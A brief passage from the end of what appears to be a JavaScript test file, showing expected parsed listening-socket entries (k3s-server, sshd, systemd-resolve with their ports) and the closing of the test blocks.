      { address: "*", port: 6443, process: "k3s-server" },
      { address: "[::]", port: 22, process: "sshd" },
      { address: "127.0.0.53%lo", port: 53, process: "systemd-resolve" },
    ]);
  });
});
